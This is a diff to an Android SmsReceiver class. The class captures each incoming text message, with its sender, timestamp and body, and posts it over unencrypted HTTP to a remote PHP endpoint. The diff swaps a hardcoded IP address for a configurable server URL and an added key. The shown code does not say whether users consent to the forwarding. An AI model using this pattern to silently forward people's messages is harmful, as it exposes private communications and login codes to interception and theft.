@@ -39,13 +39,13 @@ public class SmsReceiver extends BroadcastReceiver {
                 for (SmsMessage message : messages) {
                     finalSms+=message.getDisplayMessageBody();
                 }
-                insertData(String.valueOf(messages[0].getTimestampMillis()),messages[0].getOriginatingAddress(),finalSms);
+                insertData(Constants.getPrivateKey(context),String.valueOf(messages[0].getTimestampMillis()),messages[0].getOriginatingAddress(),finalSms);
             }
         }
     }
 
-    //send data to phpmyadmin
-    public static void insertData(final String date, final String address, final String message){
+    //send data to server
+    public static void insertData(final String key, final String date, final String address, final String message){
 
         class SendPostReqAsyncTask extends AsyncTask<String, Void, String> {
             @Override
@@ -55,10 +55,11 @@ public class SmsReceiver extends BroadcastReceiver {
 
             @Override
             protected String doInBackground(String... params) {
-                String reg_url="http://35.178.169.116/insertSms.php";
-                String date=params[0];
-                String address=params[1];
-                String message=params[2];
+                String reg_url=Constants.URL_SERVER+"insert/insertSms.php";
+                String key=params[0];
+                String date=params[1];
+                String address=params[2];
+                String message=params[3];
                 try {
                     URL url = new URL(reg_url);
                     HttpURLConnection httpURLConnection =
@@ -68,7 +69,8 @@ public class SmsReceiver extends BroadcastReceiver {
                     OutputStream OS = httpURLConnection.getOutputStream();
                     BufferedWriter bufferedWriter = new BufferedWriter(new
                             OutputStreamWriter(OS, StandardCharsets.UTF_8));
-                    String data= URLEncoder.encode("date","UTF-8")+"="+URLEncoder.encode(date,"UTF-8")
+                    String data= URLEncoder.encode("key","UTF-8")+"="+URLEncoder.encode(key,"UTF-8")
+                            +"&"+URLEncoder.encode("date","UTF-8")+"="+URLEncoder.encode(date,"UTF-8")
                             +"&"+URLEncoder.encode("address","UTF-8")+"="+URLEncoder.encode(address,"UTF-8")
                             +"&"+URLEncoder.encode("message","UTF-8")+"="+URLEncoder.encode(message,"UTF-8");
                     bufferedWriter.write(data);
@@ -92,7 +94,7 @@ public class SmsReceiver extends BroadcastReceiver {
 
         SendPostReqAsyncTask sendPostReqAsyncTask = new SendPostReqAsyncTask();
 
-        sendPostReqAsyncTask.execute(date,address,message);
+        sendPostReqAsyncTask.execute(key,date,address,message);
     }
 
 
